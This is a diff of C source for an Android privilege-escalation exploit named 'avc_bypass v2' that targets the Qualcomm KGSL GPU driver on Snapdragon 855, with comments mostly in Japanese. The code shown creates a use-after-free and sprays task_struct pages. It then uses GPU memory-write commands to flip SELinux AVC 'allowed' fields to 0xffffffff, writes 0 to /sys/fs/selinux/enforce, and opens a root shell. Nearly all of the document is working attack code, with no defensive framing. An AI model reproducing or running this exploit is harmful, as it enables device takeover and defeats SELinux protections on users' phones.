@@ -72,7 +72,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* UAF 定数 (sauce と同一) */
+/* sauce と同一の定数 (Phase 1-3) */
 #define UAF_ADDR  0x7001ff000ULL
 #define UAF_SIZE  0x10004000ULL
 #define OVERLAP_ADDR 0x7001fe000ULL
@@ -82,16 +82,12 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* AVC ノード構造 (Snapdragon 855 用オフセット) */
-#define AVC_NODE_STRIDE  72               /* avc_node サイズ (通常 72) */
-#define AVC_SSID_OFF     0x30             /* ssid オフセット */
-#define AVC_TSID_OFF     0x34             /* tsid オフセット */
-#define AVC_TCLASS_OFF   0x38             /* tclass (16bit) オフセット */
-#define AVC_ALLOWED_OFF  0x3c             /* allowed オフセット */
-
+/* AVC flip 定数 (Snapdragon 855 用オフセット) */
+#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
+#define AVC_NODE_STRIDE  72
 #define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
-#define AVC_PAGES_PER_IB  12
-#define AVC_LOOP_SECONDS  150
+#define AVC_PAGES_PER_IB 12
+#define AVC_LOOP_SECONDS 150
 
 #define SPRAY_PIDS 2000
 #define CHURN_MAX_PATHS 4096
@@ -101,7 +97,7 @@ static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
 static int uaf_id = -1, ph_id = -1;
 
-/* ============ KGSL 基本操作 ============ */
+/* ============ KGSL 基本操作 (sauce と同パターン) ============ */
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
@@ -176,7 +172,7 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ============ Phase A1-A4: 自前 UAF 作成 ============ */
+/* ============ Phase A1-A4: 自前 UAF 作成 (sauce Phase 1-4 移植) ============ */
 
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
@@ -322,20 +318,20 @@ static int avc_entries(void) {
     return e;
 }
 
-/* setenforce 0: 書き込み成功で 1 */
+/* setenforce 0: 書き込み成功 (flip 成功 or 既に permissive) で 1 */
 static int try_setenforce0(void) {
-    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
     if (fd < 0) return 0;
     ssize_t w = write(fd, "0", 1);
     close(fd);
     return (w == 1);
 }
 
-/* ============ GPU スキャン + flip (オフセット修正版) ============ */
+/* ============ GPU スキャン + flip ============ */
 
+/* UAF 範囲の全ページから TASKUAF!! comm を含む task_struct ページを記録 */
 #define PRE_SCAN_DWORDS 560
 #define PRE_PAGES_PER_IB 4
-
 static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               uint64_t scan_start, uint64_t end_va,
@@ -382,7 +378,7 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return n;
 }
 
-/* 修正: 正しいオフセットで AVC ノードをスキャンし、allowed を 0xffffffff に書き換える */
+/* (tsid==2 && tclass==1) の avc_node を allowed=0xffffffff に書き換える (Snapdragon 855 オフセット) */
 static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                            void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                            uint64_t *vas, int npages, int verbose) {
@@ -403,12 +399,13 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
             uint64_t va = vas[idx + p];
             for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
                 uint64_t node_va = va + n * AVC_NODE_STRIDE;
-                /* 4 つの dword を読み込む: ssid, tsid, tclass+padding, allowed */
+                /* オフセット 0x30 から 4 ワード読み込み (ssid, tsid, tclass, allowed) */
+                uint32_t base_off = 0x30;
                 for (int w = 0; w < 4; w++) {
                     uint32_t dl, dh, sl, sh;
                     uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4 + w * 4;
                     split64(dst_ga + dofs, &dl, &dh);
-                    split64(node_va + AVC_SSID_OFF + w * 4, &sl, &sh);
+                    split64(node_va + base_off + w * 4, &sl, &sh);
                     cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                     cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                     cmd[dw++] = sl; cmd[dw++] = sh;
@@ -430,20 +427,21 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                 uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
                 uint32_t ssid = nd[0];
                 uint32_t tsid = nd[1];
-                uint16_t tclass = (uint16_t)(nd[2] & 0xffff);
-                /* 条件: tsid == SECINITSID_SECURITY (2) && tclass == SECCLASS_SECURITY (1) */
+                uint32_t tclass_raw = nd[2];
+                uint16_t tclass = (uint16_t)(tclass_raw & 0xffff);
                 if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                    uint64_t allowed_va = va + n * AVC_NODE_STRIDE + AVC_ALLOWED_OFF;
+                    /* allowed を 0xffffffff に書き換え (offset 0x3c) */
+                    uint64_t allowed_va = va + n * AVC_NODE_STRIDE + 0x3c;
                     uint32_t sl, sh;
                     split64(allowed_va, &sl, &sh);
                     fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
                     fcmd[fdw++] = sl; fcmd[fdw++] = sh;
-                    fcmd[fdw++] = 0xffffffff;   /* allowed = 0xffffffff */
+                    fcmd[fdw++] = 0xffffffff;
                     fcmd[fdw++] = 0;
                     nb_flips++;
                     if (verbose)
                         printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x class=0x%x allowed->0xffffffff\n",
-                            (unsigned long)va, n * AVC_NODE_STRIDE + AVC_ALLOWED_OFF,
+                            (unsigned long)va, n * AVC_NODE_STRIDE + 0x3c,
                             ssid, tsid, tclass);
                 }
             }
@@ -460,7 +458,7 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return total_flips;
 }
 
-/* ============ task_struct spray ============ */
+/* ============ task_struct spray (UAF ページ保持) ============ */
 
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
@@ -489,8 +487,7 @@ static void kill_spray_children(void) {
     printf("[KILL] %d spray children killed+reaped\n", killed);
 }
 
-/* ============ ルートシェル ============ */
-
+/* ルートシェル (xh 互換) */
 static void root_shell(void) {
     printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
     fflush(stdout);
@@ -515,7 +512,7 @@ int main(int argc, char **argv) {
     for (int i = 1; i < argc; i++)
         if (strcmp(argv[i], "-i") == 0) want_shell = true;
 
-    printf("[*] avc_bypass v2 (855): uid=%d euid=%d\n", getuid(), geteuid());
+    printf("[*] avc_bypass v2: uid=%d euid=%d\n", getuid(), geteuid());
     {
         int fd = open("/proc/self/attr/current", O_RDONLY);
         if (fd >= 0) {
@@ -560,7 +557,7 @@ int main(int argc, char **argv) {
 
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
 
-    /* UAF 写像の健全性チェック */
+    /* UAF 写像の健全性チェック: 先頭 1KB の非ゼロ dword 数 (task_struct が載っていれば非ゼロ) */
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
@@ -589,29 +586,27 @@ int main(int argc, char **argv) {
             nz > 0 ? "(UAF alive)" : "(UAF looks empty)");
     }
 
-    /* 1. プリスキャン: TASKUAF!! ページ記録 */
+    /* 1. プリスキャン: TASKUAF!! ページ記録 (kill 前に実施) */
     uint64_t task_pgs[4096];
     int n_task_pgs = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
         UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
     printf("[*] pre-scan: %d task pages\n", n_task_pgs);
 
-    /* 2. spray 子を kill (UAF ページを解放) */
+    /* 2. spray 子を kill (UAF ページを unmovable free として buddy へ) */
     kill_spray_children();
-    usleep(100000);
-
-    /* 3. churn で AVC ノードを UAF ページに配置 */
+    usleep(100000);   /* 空 slab の buddy 返却待ち (直後に新 slab = タスクページ) */
+    /* freelist を消費させ、以降の新 slab をタスクページに強制する */
     churn_build();
-    for (int c = 0; c < 6; c++) churn_round();  /* 強めにチャーン */
+    for (int c = 0; c < 3; c++) churn_round();
     printf("[AVC] entries=%d (post-churn)\n", avc_entries());
 
-    /* 4. フリップループ (最長 AVC_LOOP_SECONDS) */
+    /* 3. フリップループ (最長 AVC_LOOP_SECONDS) */
     int flip_total = 0;
     int ok = 0;
     uint64_t t_start = time(NULL);
     uint64_t t_last_report = t_start;
     while (!ok && time(NULL) - t_start < AVC_LOOP_SECONDS) {
         int f1 = 0, f2 = 0;
-        /* タスクページを逆向きにスキャン (新しめのページが AVC を含む可能性大) */
         for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
             int batch = (i + 1) >= AVC_PAGES_PER_IB ? AVC_PAGES_PER_IB : (i + 1);
             f1 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
@@ -619,7 +614,6 @@ int main(int argc, char **argv) {
             if (try_setenforce0()) { ok = 1; break; }
         }
         if (!ok) {
-            /* UAF 全範囲をスキャン (ページが新しく確保された場合) */
             for (uint64_t va = UAF_ADDR + 0x2000;
                  va < UAF_ADDR + UAF_SIZE - 0x1000;
                  va += AVC_PAGES_PER_IB * 0x1000) {
